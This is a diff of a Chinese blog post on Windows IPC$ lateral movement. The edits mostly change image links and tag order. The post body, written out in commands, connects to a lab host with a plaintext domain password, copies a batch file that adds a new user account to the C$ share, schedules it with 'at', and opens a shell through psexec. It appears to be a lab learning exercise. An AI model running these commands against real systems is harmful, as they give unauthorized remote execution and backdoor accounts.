@@ -16,19 +16,19 @@
 <meta property="og:site_name" content="Obolu的小博客">
 <meta property="og:description" content="3389用惯了总觉得low，尝试学习一下IPC">
 <meta property="og:locale" content="zh-cn">
-<meta property="og:image" content="c:/Users/55398/AppData/Roaming/Typora/typora-user-images/image-20200106095715276.png">
-<meta property="og:image" content="c:/Users/55398/AppData/Roaming/Typora/typora-user-images/image-20200106095937184.png">
-<meta property="og:image" content="c:/Users/55398/AppData/Roaming/Typora/typora-user-images/image-20200106100051743.png">
-<meta property="og:image" content="c:/Users/55398/AppData/Roaming/Typora/typora-user-images/image-20200106100153346.png">
-<meta property="og:image" content="c:/Users/55398/AppData/Roaming/Typora/typora-user-images/image-20200106100239398.png">
-<meta property="og:image" content="c:/Users/55398/AppData/Roaming/Typora/typora-user-images/image-20200106101120562.png">
-<meta property="og:image" content="c:/Users/55398/AppData/Roaming/Typora/typora-user-images/image-20200106101402047.png">
-<meta property="og:image" content="c:/Users/55398/AppData/Roaming/Typora/typora-user-images/image-20200106101642235.png">
-<meta property="og:updated_time" content="2020-01-08T07:54:11.484Z">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11321603-8a8ccd83a41e0b40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11321603-c5fe21f4588ccdca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11321603-8fc01e7eaa7706e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11321603-382d69c863f9640f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11321603-6f72f0a503eeae5c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11321603-ad8ea381f9d1461f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11321603-e44511c67a95f113.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/11321603-e904233d29a10254.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2020-01-08T08:05:16.640Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="IPC命令执行学习">
 <meta name="twitter:description" content="3389用惯了总觉得low，尝试学习一下IPC">
-<meta name="twitter:image" content="c:/Users/55398/AppData/Roaming/Typora/typora-user-images/image-20200106095715276.png">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/11321603-8a8ccd83a41e0b40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
   
     <link rel="alternative" href="/atom.xml" title="Obolu的小博客" type="application/atom+xml">
   
@@ -189,19 +189,19 @@
 <h3 id="IPC命令执行学习"><a href="#IPC命令执行学习" class="headerlink" title="IPC命令执行学习"></a>IPC命令执行学习</h3><p><strong>什么是IPC？</strong></p>
 <p>IPC(Internet Process Connection)是共享”命名管道”的资源，它是为了让进程间通信而开放的命名管道，可以通过验证用户名和密码获得相应的权限,在远程管理计算机和查看计算机的共享资源时使用。</p>
 <h4 id="一、获得密码后通过IPC连接"><a href="#一、获得密码后通过IPC连接" class="headerlink" title="一、获得密码后通过IPC连接"></a>一、获得密码后通过IPC连接</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">net use \\192.168.52.138 LZXlzx553 /user:god\liukaifeng01  建立ipc连接</span><br><span class="line"></span><br><span class="line">copy add.bat \\192.168.52.138\c$\wmpub 复制add.bat到目标C盘wmpub目录</span><br><span class="line"></span><br><span class="line">add.bat里面的内容是net user LZXbabala Passw0rd! /add 添加LZXbabala用户</span><br><span class="line"></span><br><span class="line">net time \\192.168.52.138 查看目标当前时间，得到当前时间</span><br><span class="line"></span><br><span class="line">at \\192.168.52.138 10:03 c:\obolu_test\obolu.bat 告诉目标在10:03的时候运行c:\obolu_test\obolu.bat</span><br><span class="line"></span><br><span class="line">at \\192.168.52.138  查看目标的计划任务列表</span><br><span class="line"></span><br><span class="line">IPC常用命令：</span><br><span class="line">cd，dir，copy，xcopy，del，move，echo，mkdir，rmdir，type，ping，ipconfig。</span><br></pre></td></tr></table></figure>
-<p><img src="C:\Users\55398\AppData\Roaming\Typora\typora-user-images\image-20200106095715276.png" alt="image-20200106095715276"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-8a8ccd83a41e0b40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
 <p>建立IPC连接</p>
-<p><img src="C:\Users\55398\AppData\Roaming\Typora\typora-user-images\image-20200106095937184.png" alt="image-20200106095937184"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-c5fe21f4588ccdca.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
 <p>本地生成bat，上传到目标</p>
-<p><img src="C:\Users\55398\AppData\Roaming\Typora\typora-user-images\image-20200106100051743.png" alt="image-20200106100051743"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-8fc01e7eaa7706e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
 <p>添加计划任务执行</p>
-<p><img src="C:\Users\55398\AppData\Roaming\Typora\typora-user-images\image-20200106100153346.png" alt="image-20200106100153346"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-382d69c863f9640f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
 <p>发现已经添加成功</p>
-<p><img src="C:\Users\55398\AppData\Roaming\Typora\typora-user-images\image-20200106100239398.png" alt="image-20200106100239398"></p>
-<p><img src="C:\Users\55398\AppData\Roaming\Typora\typora-user-images\image-20200106101120562.png" alt="image-20200106101120562"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-6f72f0a503eeae5c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-ad8ea381f9d1461f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
 <p>喜闻乐见….权限不够</p>
-<h4 id="二、通过psexec获得cmdshell"><a href="#二、通过psexec获得cmdshell" class="headerlink" title="二、通过psexec获得cmdshell"></a>二、通过psexec获得cmdshell</h4><p><img src="C:\Users\55398\AppData\Roaming\Typora\typora-user-images\image-20200106101402047.png" alt="image-20200106101402047"></p>
-<p><img src="C:\Users\55398\AppData\Roaming\Typora\typora-user-images\image-20200106101642235.png" alt="image-20200106101642235"></p>
+<h4 id="二、通过psexec获得cmdshell"><a href="#二、通过psexec获得cmdshell" class="headerlink" title="二、通过psexec获得cmdshell"></a>二、通过psexec获得cmdshell</h4><p><img src="https://upload-images.jianshu.io/upload_images/11321603-e44511c67a95f113.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/11321603-e904233d29a10254.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="img"></p>
 <p>直接cmdshell可以创建，猜测是因为运行bat不是管理权限</p>
 
       
@@ -450,11 +450,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">知识收藏</a>
+                <a href="javascript:void(0)" class="js-tag color1">web学习</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color1">web学习</a>
+                <a href="javascript:void(0)" class="js-tag color5">知识收藏</a>
               </li>
              
               <li class="article-tag-list-item">
